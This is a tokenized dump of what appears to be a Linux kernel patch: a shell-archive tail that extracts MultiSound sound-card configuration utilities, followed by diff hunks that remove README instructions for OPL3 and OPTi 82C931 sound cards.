"config", "]", "\\", "n", "\"", "X", "\"", "\\", "n", "\"", "X", "\"", "This", "is", "for", "use", "with", "the", "card", "in", "NON", "-", "PnP", "mode", "only", ".", "\\", "n", "\"", "X", "\"", "\\", "n", "\"", "X", "\"", "Available", "devices", "(", "not", "all", "available", "for", "Fiji", ")", ":\\", "n", "\"", "X", "\"", "\\", "n", "\"", "X", "\"", "Device", "Description", "\\", "n", "\"", "X", "\"", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "\\", "n", "\"", "X", "\"", "reset", "Reset", "all", "devices", "(", "i", ".", "e", ".", "disable", ")", "\\", "n", "\"", "X", "\"", "show", "Display", "current", "device", "configurations", "\\", "n", "\"", "X", "\"", "\\", "n", "\"", "X", "\"", "dsp", "<", "io", ">", "<", "irq", ">", "<", "mem", ">", "Audio", "device", "\\", "n", "\"", "X", "\"", "mpu", "<", "io", ">", "<", "irq", ">", "Internal", "Kurzweil", "synth", "\\", "n", "\"", "X", "\"", "ide", "<", "io0", ">", "<", "io1", ">", "<", "irq", ">", "On", "-", "board", "IDE", "controller", "\\", "n", "\"", "X", "\"", "joystick", "<", "io", ">", "Joystick", "port", "\\", "n", "\"", "X", "\"", "\\", "n", "\"", ");", "X", "exit", "(", "1", ")", ";", "}", "X", "static", "int", "cfg_reset", "(", "void", ")", "{", "X", "int", "i", ";", "X", "X", "for", "(", "i", "=", "0", ";", "i", "<", "4", ";", "+", "+", "i", ")", "X", "msnd_write_cfg_logical", "(", "config_port", ",", "i", ",", "0", ",", "0", ",", "0", ",", "0", ")", ";", "X", "X", "return", "0", ";", "}", "X", "static", "int", "cfg_show", "(", "void", ")", "{", "X", "int", "i", ";", "X", "int", "count", "=", "0", ";", "X", "X", "for", "(", "i", "=", "0", ";", "i", "<", "4", ";", "+", "+", "i", ")", "{", "X", "WORD", "io0", ",", "io1", ",", "irq", ";", "X", "int", "mem", ";", "X", "msnd_read_cfg_logical", "(", "config_port", ",", "i", ",", "&", "io0", ",", "&", "io1", ",", "&", "irq", ",", "&", "mem", ")", ";", "X", "switch", "(", "i", ")", "{", "X", "case", "0", ":", "X", "if", "(", "io0", "|", "|", "irq", "|", "|", "mem", ")", "{", "X", "printf", "(", "\"", "dsp", "0x", "%", "x", "%", "d", "0x", "%", "x", "\\", "n", "\"", ",", "io0", ",", "irq", ",", "mem", ")", ";", "X", "+", "+", "count", ";", "X", "}", "X", "break", ";", "X", "case", "1", ":", "X", "if", "(", "io0", "|", "|", "irq", ")", "{", "X", "printf", "(", "\"", "mpu", "0x", "%", "x", "%", "d", "\\", "n", "\"", ",", "io0", ",", "irq", ")", ";", "X", "+", "+", "count", ";", "X", "}", "X", "break", ";", "X", "case", "2", ":", "X", "if", "(", "io0", "|", "|", "io1", "|", "|", "irq", ")", "{", "X", "printf", "(", "\"", "ide", "0x", "%", "x", "0x", "%", "x", "%", "d", "\\", "n", "\"", ",", "io0", ",", "io1", ",", "irq", ")", ";", "X", "+", "+", "count", ";", "X", "}", "X", "break", ";", "X", "case", "3", ":", "X", "if", "(", "io0", ")", "{", "X", "printf", "(", "\"", "joystick", "0x", "%", "x", "\\", "n", "\"", ",", "io0", ")", ";", "X", "+", "+", "count", ";", "X", "}", "X", "break", ";", "X", "}", "X", "}", "X", "X", "if", "(", "count", "=", "=", "0", ")", "X", "fprintf", "(", "stderr", ",", "\"", "no", "devices", "configured", "\\", "n", "\"", ");", "X", "X", "return", "0", ";", "}", "X", "static", "int", "cfg_dsp", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "int", "io", ",", "irq", ",", "mem", ";", "X", "X", "if", "(", "argc", "<", "3", "|", "|", "X", "sscanf", "(", "argv", "[", "0", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "io", ")", "!", "=", "1", "|", "|", "X", "sscanf", "(", "argv", "[", "1", "]", ",", "\"", "%", "d", "\"", ",", "&", "irq", ")", "!", "=", "1", "|", "|", "X", "sscanf", "(", "argv", "[", "2", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "mem", ")", "!", "=", "1", ")", "X", "usage", "(", ");", "X", "X", "if", "(", "!(", "io", "=", "=", "0x290", "|", "|", "X", "io", "=", "=", "0x260", "|", "|", "X", "io", "=", "=", "0x250", "|", "|", "X", "io", "=", "=", "0x240", "|", "|", "X", "io", "=", "=", "0x230", "|", "|", "X", "io", "=", "=", "0x220", "|", "|", "X", "io", "=", "=", "0x210", "|", "|", "X", "io", "=", "=", "0x3e0", ")", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "io", "must", "be", "one", "of", "\"", "X", "\"", "210", ",", "220", ",", "230", ",", "240", ",", "250", ",", "260", ",", "290", ",", "or", "3E0", "\\", "n", "\"", ");", "X", "usage", "(", ");", "X", "}", "X", "X", "if", "(", "!(", "irq", "=", "=", "5", "|", "|", "X", "irq", "=", "=", "7", "|", "|", "X", "irq", "=", "=", "9", "|", "|", "X", "irq", "=", "=", "10", "|", "|", "X", "irq", "=", "=", "11", "|", "|", "X", "irq", "=", "=", "12", ")", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "irq", "must", "be", "one", "of", "\"", "X", "\"", "5", ",", "7", ",", "9", ",", "10", ",", "11", "or", "12", "\\", "n", "\"", ");", "X", "usage", "(", ");", "X", "}", "X", "X", "if", "(", "!(", "mem", "=", "=", "0xb0000", "|", "|", "X", "mem", "=", "=", "0xc8000", "|", "|", "X", "mem", "=", "=", "0xd0000", "|", "|", "X", "mem", "=", "=", "0xd8000", "|", "|", "X", "mem", "=", "=", "0xe0000", "|", "|", "X", "mem", "=", "=", "0xe8000", ")", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "mem", "must", "be", "one", "of", "\"", "X", "\"", "0xb0000", ",", "0xc8000", ",", "0xd0000", ",", "0xd8000", ",", "0xe0000", "or", "0xe8000", "\\", "n", "\"", ");", "X", "usage", "(", ");", "X", "}", "X", "X", "return", "msnd_write_cfg_logical", "(", "config_port", ",", "0", ",", "io", ",", "0", ",", "irq", ",", "mem", ")", ";", "}", "X", "static", "int", "cfg_mpu", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "int", "io", ",", "irq", ";", "X", "X", "if", "(", "argc", "<", "2", "|", "|", "X", "sscanf", "(", "argv", "[", "0", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "io", ")", "!", "=", "1", "|", "|", "X", "sscanf", "(", "argv", "[", "1", "]", ",", "\"", "%", "d", "\"", ",", "&", "irq", ")", "!", "=", "1", ")", "X", "usage", "(", ");", "X", "X", "return", "msnd_write_cfg_logical", "(", "config_port", ",", "1", ",", "io", ",", "0", ",", "irq", ",", "0", ")", ";", "}", "X", "static", "int", "cfg_ide", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "int", "io0", ",", "io1", ",", "irq", ";", "X", "X", "if", "(", "argc", "<", "3", "|", "|", "X", "sscanf", "(", "argv", "[", "0", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "io0", ")", "!", "=", "1", "|", "|", "X", "sscanf", "(", "argv", "[", "0", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "io1", ")", "!", "=", "1", "|", "|", "X", "sscanf", "(", "argv", "[", "1", "]", ",", "\"", "%", "d", "\"", ",", "&", "irq", ")", "!", "=", "1", ")", "X", "usage", "(", ");", "X", "X", "return", "msnd_write_cfg_logical", "(", "config_port", ",", "2", ",", "io0", ",", "io1", ",", "irq", ",", "0", ")", ";", "}", "X", "static", "int", "cfg_joystick", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "int", "io", ";", "X", "X", "if", "(", "argc", "<", "1", "|", "|", "X", "sscanf", "(", "argv", "[", "0", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "io", ")", "!", "=", "1", ")", "X", "usage", "(", ");", "X", "X", "return", "msnd_write_cfg_logical", "(", "config_port", ",", "3", ",", "io", ",", "0", ",", "0", ",", "0", ")", ";", "}", "X", "int", "main", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "char", "*", "device", ";", "X", "int", "rv", "=", "0", ";", "X", "X", "-", "-", "argc", ";", "+", "+", "argv", ";", "X", "X", "if", "(", "argc", "<", "2", ")", "X", "usage", "(", ");", "X", "X", "sscanf", "(", "argv", "[", "0", "]", ",", "\"", "0x", "%", "x", "\"", ",", "&", "config_port", ")", ";", "X", "if", "(", "config_port", "!", "=", "0x250", "&", "&", "config_port", "!", "=", "0x260", "&", "&", "config_port", "!", "=", "0x270", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "<", "config", "port", ">", "must", "be", "0x250", ",", "0x260", "or", "0x270", "\\", "n", "\"", ");", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "if", "(", "ioperm", "(", "config_port", ",", "2", ",", "1", ")", ")", "{", "X", "perror", "(", "\"", "ioperm", "\"", ");", "X", "fprintf", "(", "stderr", ",", "\"", "note", ":", "pinnaclecfg", "must", "be", "run", "as", "root", "\\", "n", "\"", ");", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "device", "=", "argv", "[", "1", "]", ";", "X", "X", "argc", "-", "=", "2", ";", "argv", "+", "=", "2", ";", "X", "X", "if", "(", "strcmp", "(", "device", ",", "\"", "reset", "\"", ")", "=", "=", "0", ")", "X", "rv", "=", "cfg_reset", "(", ");", "X", "else", "if", "(", "strcmp", "(", "device", ",", "\"", "show", "\"", ")", "=", "=", "0", ")", "X", "rv", "=", "cfg_show", "(", ");", "X", "else", "if", "(", "strcmp", "(", "device", ",", "\"", "dsp", "\"", ")", "=", "=", "0", ")", "X", "rv", "=", "cfg_dsp", "(", "argc", ",", "argv", ")", ";", "X", "else", "if", "(", "strcmp", "(", "device", ",", "\"", "mpu", "\"", ")", "=", "=", "0", ")", "X", "rv", "=", "cfg_mpu", "(", "argc", ",", "argv", ")", ";", "X", "else", "if", "(", "strcmp", "(", "device", ",", "\"", "ide", "\"", ")", "=", "=", "0", ")", "X", "rv", "=", "cfg_ide", "(", "argc", ",", "argv", ")", ";", "X", "else", "if", "(", "strcmp", "(", "device", ",", "\"", "joystick", "\"", ")", "=", "=", "0", ")", "X", "rv", "=", "cfg_joystick", "(", "argc", ",", "argv", ")", ";", "X", "else", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "unknown", "device", "%", "s", "\\", "n", "\"", ",", "device", ")", ";", "X", "usage", "(", ");", "X", "}", "X", "X", "if", "(", "rv", ")", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "device", "configuration", "failed", "\\", "n", "\"", ");", "X", "X", "return", "0", ";", "}", "SHAR_EOF", "$", "shar_touch", "-", "am", "1204092598", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "&", "&", "chmod", "0664", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "|", "|", "$", "echo", "'", "restore", "of", "'", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "'", "failed", "'", "if", "(", "md5sum", "-", "-", "help", "2", ">", "&", "1", "|", "grep", "'", "sage", ":", "md5sum", "\\", "['", ")", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "&", "&", "(", "md5sum", "-", "-", "version", "2", ">", "&", "1", "|", "grep", "-", "v", "'", "textutils", "1", ".", "12", "'", ")", ">", "/", "dev", "/", "null", ";", "then", "md5sum", "-", "c", "<", "<", "SHAR_EOF", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", ":", "'", "'", "MD5", "check", "failed", "'", "366bdf27f0db767a3c7921d0a6db20fe", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "SHAR_EOF", "else", "shar_count", "=", "\"`", "LC_ALL", "=", "LC_CTYPE", "=", "LANG", "=", "wc", "-", "c", "<", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", "'", "`\"", "test", "10235", "-", "eq", "\"", "$", "shar_count", "\"", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "pinnaclecfg", ".", "c", ":", "'", "'", "original", "size", "'", "'", "10235", ",", "'", "'", "current", "size", "'", "\"", "$", "shar_count", "!", "\"", "fi", "fi", "#", "=", "==", "==", "==", "==", "==", "==", "MultiSound", ".", "d", "/", "Makefile", "=", "==", "==", "==", "==", "==", "==", "=", "if", "test", "-", "f", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "&", "&", "test", "\"", "$", "first_param", "\"", "!", "=", "-", "c", ";", "then", "$", "echo", "'", "x", "-", "'", "SKIPPING", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "'", "(", "file", "already", "exists", ")", "'", "else", "$", "echo", "'", "x", "-", "'", "extracting", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "'", "(", "text", ")", "'", "sed", "'", "s", "/", "^", "X", "/", "/'", "<", "<", "'", "SHAR_EOF", "'", ">", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "&", "&", "CC", "=", "gcc", "CFLAGS", "=", "-", "O", "PROGS", "=", "setdigital", "msndreset", "pinnaclecfg", "conv", "X", "all", ":", "$", "(", "PROGS", ")", "X", "clean", ":", "X", "rm", "-", "f", "$", "(", "PROGS", ")", "SHAR_EOF", "$", "shar_touch", "-", "am", "1204092398", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "&", "&", "chmod", "0664", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "|", "|", "$", "echo", "'", "restore", "of", "'", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "'", "failed", "'", "if", "(", "md5sum", "-", "-", "help", "2", ">", "&", "1", "|", "grep", "'", "sage", ":", "md5sum", "\\", "['", ")", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "&", "&", "(", "md5sum", "-", "-", "version", "2", ">", "&", "1", "|", "grep", "-", "v", "'", "textutils", "1", ".", "12", "'", ")", ">", "/", "dev", "/", "null", ";", "then", "md5sum", "-", "c", "<", "<", "SHAR_EOF", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "Makefile", ":", "'", "'", "MD5", "check", "failed", "'", "76ca8bb44e3882edcf79c97df6c81845", "MultiSound", ".", "d", "/", "Makefile", "SHAR_EOF", "else", "shar_count", "=", "\"`", "LC_ALL", "=", "LC_CTYPE", "=", "LANG", "=", "wc", "-", "c", "<", "'", "MultiSound", ".", "d", "/", "Makefile", "'", "`\"", "test", "106", "-", "eq", "\"", "$", "shar_count", "\"", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "Makefile", ":", "'", "'", "original", "size", "'", "'", "106", ",", "'", "'", "current", "size", "'", "\"", "$", "shar_count", "!", "\"", "fi", "fi", "#", "=", "==", "==", "==", "==", "==", "==", "MultiSound", ".", "d", "/", "conv", ".", "l", "=", "==", "==", "==", "==", "==", "==", "=", "if", "test", "-", "f", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "&", "&", "test", "\"", "$", "first_param", "\"", "!", "=", "-", "c", ";", "then", "$", "echo", "'", "x", "-", "'", "SKIPPING", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "'", "(", "file", "already", "exists", ")", "'", "else", "$", "echo", "'", "x", "-", "'", "extracting", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "'", "(", "text", ")", "'", "sed", "'", "s", "/", "^", "X", "/", "/'", "<", "<", "'", "SHAR_EOF", "'", ">", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "&", "&", "%", "%", "[", "\\", "n", "\\", "t", ",", "\\", "r", "]", "\\", ";.", "*", "DB", "[", "0", "-", "9A", "-", "Fa", "-", "f", "]", "+", "H", "{", "int", "n", ";", "sscanf", "(", "yytext", ",", "\"", "%", "xH", "\"", ",", "&", "n", ")", ";", "printf", "(", "\"%", "c", "\"", ",", "n", ")", ";", "}", "%", "%", "int", "yywrap", "(", ")", "{", "return", "1", ";", "}", "main", "(", ")", "{", "yylex", "(", ");", "}", "SHAR_EOF", "$", "shar_touch", "-", "am", "0828231798", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "&", "&", "chmod", "0664", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "|", "|", "$", "echo", "'", "restore", "of", "'", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "'", "failed", "'", "if", "(", "md5sum", "-", "-", "help", "2", ">", "&", "1", "|", "grep", "'", "sage", ":", "md5sum", "\\", "['", ")", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "&", "&", "(", "md5sum", "-", "-", "version", "2", ">", "&", "1", "|", "grep", "-", "v", "'", "textutils", "1", ".", "12", "'", ")", ">", "/", "dev", "/", "null", ";", "then", "md5sum", "-", "c", "<", "<", "SHAR_EOF", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", ":", "'", "'", "MD5", "check", "failed", "'", "d2411fc32cd71a00dcdc1f009e858dd2", "MultiSound", ".", "d", "/", "conv", ".", "l", "SHAR_EOF", "else", "shar_count", "=", "\"`", "LC_ALL", "=", "LC_CTYPE", "=", "LANG", "=", "wc", "-", "c", "<", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", "'", "`\"", "test", "141", "-", "eq", "\"", "$", "shar_count", "\"", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "conv", ".", "l", ":", "'", "'", "original", "size", "'", "'", "141", ",", "'", "'", "current", "size", "'", "\"", "$", "shar_count", "!", "\"", "fi", "fi", "#", "=", "==", "==", "==", "==", "==", "==", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "=", "==", "==", "==", "==", "==", "==", "=", "if", "test", "-", "f", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "&", "&", "test", "\"", "$", "first_param", "\"", "!", "=", "-", "c", ";", "then", "$", "echo", "'", "x", "-", "'", "SKIPPING", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "'", "(", "file", "already", "exists", ")", "'", "else", "$", "echo", "'", "x", "-", "'", "extracting", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "'", "(", "text", ")", "'", "sed", "'", "s", "/", "^", "X", "/", "/'", "<", "<", "'", "SHAR_EOF", "'", ">", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "&", "&", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "X", "*", "X", "*", "msndreset", ".", "c", "-", "resets", "the", "MultiSound", "card", "X", "*", "X", "*", "Copyright", "(", "C", ")", "1998", "Andrew", "Veliath", "X", "*", "X", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "X", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "X", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "X", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "X", "*", "X", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "X", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "X", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "X", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "X", "*", "X", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "X", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "X", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "X", "*", "X", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "X", "#", "include", "<", "stdio", ".", "h", ">", "#", "include", "<", "unistd", ".", "h", ">", "#", "include", "<", "fcntl", ".", "h", ">", "#", "include", "<", "sys", "/", "types", ".", "h", ">", "#", "include", "<", "sys", "/", "stat", ".", "h", ">", "#", "include", "<", "sys", "/", "ioctl", ".", "h", ">", "#", "include", "<", "sys", "/", "soundcard", ".", "h", ">", "X", "int", "main", "(", "int", "argc", ",", "char", "*", "argv", "[", "])", "{", "X", "int", "fd", ";", "X", "X", "if", "(", "argc", "!", "=", "2", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "usage", ":", "msndreset", "<", "mixer", "device", ">", "\\", "n", "\"", ");", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "if", "(", "(", "fd", "=", "open", "(", "argv", "[", "1", "]", ",", "O_RDWR", ")", ")", "<", "0", ")", "{", "X", "perror", "(", "argv", "[", "1", "]", ");", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "if", "(", "ioctl", "(", "fd", ",", "SOUND_MIXER_PRIVATE1", ",", "0", ")", "<", "0", ")", "{", "X", "fprintf", "(", "stderr", ",", "\"", "error", ":", "msnd", "ioctl", "reset", "failed", "\\", "n", "\"", ");", "X", "perror", "(", "\"", "ioctl", "\"", ");", "X", "close", "(", "fd", ")", ";", "X", "exit", "(", "1", ")", ";", "X", "}", "X", "X", "close", "(", "fd", ")", ";", "X", "X", "return", "0", ";", "}", "SHAR_EOF", "$", "shar_touch", "-", "am", "1204100698", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "&", "&", "chmod", "0664", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "|", "|", "$", "echo", "'", "restore", "of", "'", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "'", "failed", "'", "if", "(", "md5sum", "-", "-", "help", "2", ">", "&", "1", "|", "grep", "'", "sage", ":", "md5sum", "\\", "['", ")", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "&", "&", "(", "md5sum", "-", "-", "version", "2", ">", "&", "1", "|", "grep", "-", "v", "'", "textutils", "1", ".", "12", "'", ")", ">", "/", "dev", "/", "null", ";", "then", "md5sum", "-", "c", "<", "<", "SHAR_EOF", ">", "/", "dev", "/", "null", "2", ">", "&", "1", "\\", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", ":", "'", "'", "MD5", "check", "failed", "'", "c52f876521084e8eb25e12e01dcccb8a", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "SHAR_EOF", "else", "shar_count", "=", "\"`", "LC_ALL", "=", "LC_CTYPE", "=", "LANG", "=", "wc", "-", "c", "<", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", "'", "`\"", "test", "1472", "-", "eq", "\"", "$", "shar_count", "\"", "|", "|", "$", "echo", "'", "MultiSound", ".", "d", "/", "msndreset", ".", "c", ":", "'", "'", "original", "size", "'", "'", "1472", ",", "'", "'", "current", "size", "'", "\"", "$", "shar_count", "!", "\"", "fi", "fi", "rm", "-", "fr", "_sh01426", "exit", "0", "@", "@", "-", "1", ",", "6", "+", "0", ",", "0", "@", "@", "A", "pure", "OPL3", "card", "is", "nice", "and", "easy", "to", "configure", ".", "Simply", "do", "insmod", "opl3", "io", "=", "0x388", "Change", "the", "I", "/", "O", "address", "in", "the", "very", "unlikely", "case", "this", "card", "is", "differently", "configured", "@", "@", "-", "1", ",", "218", "+", "0", ",", "0", "@", "@", "Support", "for", "the", "OPTi", "82C931", "chip", "Note", ":", "parts", "of", "this", "README", "file", "apply", "also", "to", "other", "cards", "that", "use", "the", "mad16", "driver", ".", "Some", "items", "in", "this", "README", "file", "are", "based", "on", "features", "added", "to", "the", "sound", "driver", "after", "Linux", "-", "2", ".", "1", ".", "91", "was", "out", ".", "By", "the", "time", "of", "writing", "this", "I", "do", "not", "know", "which", "official", "kernel", "release", "will", "include", "these", "features", ".", "Please", "do", "not", "report", "inconsistencies", "on", "older", "Linux", "kernels", ".", "The", "OPTi", "82C931", "is", "supported", "in", "its", "non", "-", "PnP", "mode", ".", "Usually", "you", "do", "not", "need", "to", "set", "jumpers", ",", "etc", ".", "The", "sound", "driver", "will", "check", "the", "card", "status", "and", "if", "it", "is", "required", "it", "will", "force", "the", "card", "into", "a", "mode", "in", "which", "it", "can", "be", "programmed", ".", "If", "you", "have", "another", "OS", "installed", "on", "your", "computer", "it", "is", "recommended", "that", "Linux", "and", "the", "other", "OS", "use", "the", "same", "resources", ".", "Also", ",", "it", "is", "recommended", "that", "resources", "specified", "in", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", "and", "resources", "specified", "in", "/", "etc", "/", "isapnp", ".", "conf", "agree", ".", "Compiling", "the", "sound", "driver", "I", "highly", "recommend", "that", "you", "build", "a", "modularized", "sound", "driver", ".", "This", "document", "does", "not", "cover", "a", "sound", "-", "driver", "which", "is", "built", "in", "the", "kernel", ".", "Sound", "card", "support", "should", "be", "enabled", "as", "a", "module", "(", "chose", "m", ")", ".", "Answer", "'", "m", "'", "for", "these", "items", ":", "Generic", "OPL2", "/", "OPL3", "FM", "synthesizer", "support", "(", "CONFIG_SOUND_ADLIB", ")", "Microsoft", "Sound", "System", "support", "(", "CONFIG_SOUND_MSS", ")", "Support", "for", "OPTi", "MAD16", "and", "/", "or", "Mozart", "based", "cards", "(", "CONFIG_SOUND_MAD16", ")", "FM", "synthesizer", "(", "YM3812", "/", "OPL", "-", "3", ")", "support", "(", "CONFIG_SOUND_YM3812", ")", "The", "configuration", "menu", "may", "ask", "for", "addresses", ",", "IRQ", "lines", "or", "DMA", "channels", ".", "If", "the", "card", "is", "used", "as", "a", "module", "the", "module", "loading", "options", "will", "override", "these", "values", ".", "For", "the", "OPTi", "931", "you", "can", "answer", "'", "n", "'", "to", ":", "Support", "MIDI", "in", "older", "MAD16", "based", "cards", "(", "requires", "SB", ")", "(", "CONFIG_SOUND_MAD16_OLDCARD", ")", "If", "you", "do", "need", "MIDI", "support", "in", "a", "Mozart", "or", "C928", "based", "card", "you", "need", "to", "answer", "'", "m", "'", "to", "the", "above", "question", ".", "In", "that", "case", "you", "will", "also", "need", "to", "answer", "'", "m", "'", "to", ":", "'", "100", "%", "Sound", "Blaster", "compatibles", "(", "SB16", "/", "32", "/", "64", ",", "ESS", ",", "Jazz16", ")", "support", "'", "(", "CONFIG_SOUND_SB", ")", "Go", "on", "and", "compile", "your", "kernel", "and", "modules", ".", "Install", "the", "modules", ".", "Run", "depmod", "-", "a", ".", "Using", "isapnptools", "In", "most", "systems", "with", "a", "PnP", "BIOS", "you", "do", "not", "need", "to", "use", "isapnp", ".", "The", "initialization", "provided", "by", "the", "BIOS", "is", "sufficient", "for", "the", "driver", "to", "pick", "up", "the", "card", "and", "continue", "initialization", ".", "If", "that", "fails", ",", "or", "if", "you", "have", "other", "PnP", "cards", ",", "you", "need", "to", "use", "isapnp", "to", "initialize", "the", "card", ".", "This", "was", "tested", "with", "isapnptools", "-", "1", ".", "11", "but", "I", "recommend", "that", "you", "use", "isapnptools", "-", "1", ".", "13", "(", "or", "newer", ")", ".", "Run", "pnpdump", "to", "dump", "the", "information", "about", "your", "PnP", "cards", ".", "Then", "edit", "the", "resulting", "file", "and", "select", "the", "options", "of", "your", "choice", ".", "This", "file", "is", "normally", "installed", "as", "/", "etc", "/", "isapnp", ".", "conf", ".", "The", "driver", "has", "one", "limitation", "with", "respect", "to", "I", "/", "O", "port", "resources", ":", "IO3", "base", "must", "be", "0x0E0C", ".", "Although", "isapnp", "allows", "other", "ports", ",", "this", "address", "is", "hard", "-", "coded", "into", "the", "driver", ".", "Using", "kmod", "and", "autoloading", "the", "sound", "driver", "Config", "files", "in", "'", "/", "etc", "/", "modprobe", ".", "d", "/", "'", "are", "used", "as", "below", ":", "alias", "mixer0", "mad16", "alias", "audio0", "mad16", "alias", "midi0", "mad16", "alias", "synth0", "opl3", "options", "sb", "mad16", "=", "1", "options", "mad16", "irq", "=", "10", "dma", "=", "0", "dma16", "=", "1", "io", "=", "0x530", "joystick", "=", "1", "cdtype", "=", "0", "options", "opl3", "io", "=", "0x388", "install", "mad16", "/", "sbin", "/", "modprobe", "-", "i", "mad16", "&", "&", "/", "sbin", "/", "ad1848_mixer_reroute", "14", "8", "15", "3", "16", "6", "If", "you", "have", "an", "MPU", "daughtercard", "or", "onboard", "MPU", "you", "will", "want", "to", "add", "to", "the", "\"", "options", "mad16", "\"", "line", "-", "eg", "options", "mad16", "irq", "=", "5", "dma", "=", "0", "dma16", "=", "3", "io", "=", "0x530", "mpu_io", "=", "0x330", "mpu_irq", "=", "9", "To", "set", "the", "I", "/", "O", "and", "IRQ", "of", "the", "MPU", ".", "Explain", ":", "alias", "mixer0", "mad16", "alias", "audio0", "mad16", "alias", "midi0", "mad16", "alias", "synth0", "opl3", "When", "any", "sound", "device", "is", "opened", "the", "kernel", "requests", "auto", "-", "loading", "of", "char", "-", "major", "-", "14", ".", "There", "is", "a", "built", "-", "in", "alias", "that", "translates", "this", "request", "to", "loading", "the", "main", "sound", "module", ".", "The", "sound", "module", "in", "its", "turn", "will", "request", "loading", "of", "a", "sub", "-", "driver", "for", "mixer", ",", "audio", ",", "midi", "or", "synthesizer", "device", ".", "The", "first", "3", 